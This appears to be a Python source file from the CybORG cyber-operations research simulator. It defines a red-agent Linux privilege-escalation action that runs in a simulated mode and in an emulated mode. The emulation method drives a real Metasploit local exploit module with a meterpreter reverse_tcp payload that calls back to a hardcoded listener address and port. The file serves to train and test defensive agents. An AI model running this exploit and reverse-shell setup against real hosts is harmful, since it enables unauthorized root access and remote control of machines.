## The following code contains work of the United States Government and is not subject to domestic copyright protection under 17 USC § 105.
## Additionally, we waive copyright and related rights in the utilized code worldwide through the CC0 1.0 Universal public domain dedication.

# pylint: disable=invalid-name
from typing import Tuple
from ipaddress import IPv4Address
from random import choice

from CybORG.Shared import Observation
from CybORG.Shared.Actions.MSFActionsFolder.MSFPrivilegeEscalationFolder.MSFPrivilegeEscalation import MSFPrivilegeEscalation
from CybORG.Shared.Enums import OperatingSystemType
from CybORG.Simulator.Host import Host
from CybORG.Simulator.Process import Process
from CybORG.Simulator.State import State


class MSFSubUidShell(MSFPrivilegeEscalation):
    """
    Implements the SubUidShell permissions escalation action
    """
    def __init__(self, session: int, agent: str, ip_address: IPv4Address):
        super().__init__(session, agent)
        self.ip_address = ip_address

    def sim_execute(self, state: State) -> Observation:
        # comment out the below and implement AbstractActions/PrivilegeEscalation logic
        #return self.sim_escalate(state, "root")

        # implement equivalent of session handler within State object
        # sessions = state.get_sessions_by_remote_ip(self.ip_address)
        # find session on the chosen host
        hostname = state.ip_addresses[self.ip_address]
        print("hostname")
        print(hostname)
        print("all sessions in state")
        for sn in state.sessions[self.agent].values():
            print(sn.get_state())
        sessions = [s for s in state.sessions[self.agent].values() if s.host == hostname]
        print("sessions on the target host")
        print(sessions)
        if len(sessions) == 0:
            # no valid session could be found on chosen host
            return Observation(success=False)

        target_host_session = None
        obs = Observation(False)
        for sess in sessions:
            if sess.host == hostname:
                # target_session is on the host
                target_host_session = sess
                # find if this target_session is already SYSTEM or root
                if sess.username in ('root', 'SYSTEM'):
                   obs.set_success(True)
                   tmp=sess.get_state()
                   print(tmp["pid"])
                   obs.add_session_info(hostid=hostname, **sess.get_state())
                   return obs

        # target session is not on the host.
        if target_host_session is None:
            return obs

        # if session in sandboxed (ie decoy sessions used by blue agent), the escalation fails
        # and the session is removed from the target
        if target_host_session.is_escalate_sandbox:
               state.remove_process(target_host_session.host, target_host_session.pid)
               return Observation(success=False), -1

        else:
               obs=self.sim_escalate(state, hostname, sess, "root")

        return obs


    def emu_execute(self, session_handler) -> Observation:
        obs = Observation()
        user = None
        from CybORG.Emulator.Session import MSFSessionHandler
        if type(session_handler) is not MSFSessionHandler:
            obs.set_success(False)
            return obs
        print("server session {}".format(self.session))
        # get sessions for the target_host
        target_sessions = session_handler.get_session_by_remote_ip(str(self.ip_address), session_type="shell")
        if len(target_sessions) == 0:
            obs.set_success(False)
            return obs
        else:
          target_session = list(target_sessions.keys())[0]
          output = session_handler.execute_module(mtype='exploit', 
                                         mname='linux/local/nested_namespace_idmap_limit_priv_esc',
                                         opts = { "SESSION": target_session },
                                         payload_name="linux/x86/meterpreter/reverse_tcp",
                                         payload_opts={'LHOST': "10.46.64.10", 'LPORT': 4455})
          obs.add_raw_obs(output)
          obs.set_success(False)
          session = None
          try:
            for line in output.split('\n'):
              if '[*] Meterpreter session' in line:
                obs.set_success(True)
                #print(list(enumerate(line.split(' '))))
                split = line.split(' ')
                session = int(split[3])
                if '-' in split[5]:
                    temp = split[5].replace('(', '').split(':')[0]
                    origin, rip = temp.split('-')
                    # obs.add_process(remote_address=rip, local_address=origin)
                    rport = None
                else:
                    rip, rport = split[5].replace('(', '').split(':')
                lip, lport = split[7].replace(')', '').split(':')
                obs.add_process(hostid=str(self.ip_address), local_address=lip, local_port=lport, remote_address=rip, remote_port=rport)
            # get user id of session
            print("get user from session")
            user = session_handler.get_session_user(session)
            print(user)
            if user is None:
              obs = Observation()
              obs.set_success(False)
            else:
              obs.add_session_info(hostid=str(self.ip_address), username=user, session_id=session, session_type='meterpreter', agent=self.agent)
          except Exception as ex:
            session_handler._log_debug(f'Error occured in parsing of output: {output}')
            raise ex
        session_handler._log_debug(output)
        return obs

    def test_exploit_works(self, target_host: Host) -> Tuple[bool, Tuple[Process,...]]:
        # the exact patches and OS distributions are described here:
        # NOTE: doesn't implement any patch reference.
        # ie all linux hosts are exploitable
        # returns empty tuple necessary processes
        return target_host.os_type == OperatingSystemType.LINUX, ()

    def __str__(self):
        return f"{self.__class__.__name__} Target: {self.ip_address}"

